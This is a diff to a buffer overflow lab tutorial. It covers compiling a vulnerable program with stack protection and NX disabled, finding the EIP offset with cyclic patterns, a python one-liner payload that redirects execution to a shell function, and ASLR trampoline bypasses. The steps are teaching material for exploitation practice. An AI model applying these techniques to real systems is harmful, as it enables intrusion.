@@ -4,7 +4,11 @@
 ```
 To get started
 	You will need the files: segment_mem.c, wisdom.c, runescape.sh, pat_gen.py, pat_ind.py
-	You will need gdb-peda to execute some of the gdb commands such as checksec.
+		git clone https://github.com/parkergarrison/overflow
+
+	You will need gdb-peda to execute some of the gdb commands such as checksec:
+		git clone https://github.com/longld/peda.git ~/peda
+		echo "source ~/peda/peda.py" >> ~/.gdbinit
 
 Memory and the Stack
 	Ensure ASLR is off
@@ -14,27 +18,35 @@ Memory and the Stack
 		gcc segment_mem.c -o segment_mem
 	
 	Run this binary to examine addresses which are in various memory segments:
-		./segment_mem
-			Address of etext: 080485c8
-			Address of edata: 0804989c
-			Address of end: 080498a8
+		./segment_mem example output:
 			Address in .text: 04244c8d
-			Address in .data: 08048616
-			Address in .data: 08049898
-			Address in .bss: 080498a4
-			Address in heap: 0804a008
-			Address in stack: bffff4ee
-			
+
+			Address of etext: 08048688
+			Address in .data: 08048690
+			Address in .data: 0804996c
+
+			Address of edata: 08049970
+			Address in .bss: 08049978
+
+			Address of end: 0804997c
+			Address in heap: 09a93008
+
+			...
+
+			Address in stack: bfd2f98e
+			Address in stack: bfd2f98e
+			Address in stack: bfd2f988
+		
 Exploit Mitigations and Bypasses
-	No Mitigations
-		Compile wisdom.c without NX
-			gcc wisdom.c -g -o wisdom.out -fno-stack-protector -z execstack
+	Exercise 0: No Mitigations
+		Compile wisdom-basic.c without NX
+			gcc wisdom-basic.c -g -fno-stack-protector -z execstack -o wisdom_e0.out 
 		
 		Generate a cyclic pattern of length 300
 			chmod +x ./pat_gen.py
 			./pat_gen.py 300
 		
-		Compute the offset of the pattern
+		Compute the offset of the start of the pattern to saved value of EIP
 			chmod +x ./pat_ind.py
 			python ./pat_ind.py [hexdigits]
 		
@@ -47,9 +59,9 @@ Exploit Mitigations and Bypasses
 		Print escaped attack code to call shell function
 			python -c 'print "A"*152 + r"\xfc\x85\x04\x08"'
 
-		Execute wisdom.out while escaping input
+		Execute program while escaping input
 			chmod +x runescape.sh
-			./runescape.sh ./wisdom.out
+			./runescape.sh ./wisdom_e0.out
 		
 		Ensure that pgrep will find the correct process
 			ps -ef | grep wisdom
@@ -60,6 +72,19 @@ Exploit Mitigations and Bypasses
 		Detach from gdb
 			gdb> detach
 	
+	Exercise 1: No mitigations, no shell function
+		There are a few differences from above.
+		
+		Compile wisdom.c without NX
+			gcc wisdom.c -g -fno-stack-protector -z execstack -o wisdom.out
+		
+		Generate a pattern to use as input and compute the offset to saved EIP
+			./pat_gen.py 300
+			python ./pat_ind.py [hexdigits]
+		
+		
+		
+			
 	Bypass ASLR, no NX with Trampoline
 		Find useful ESP gadgets
 			gdb-peda> jmpcall
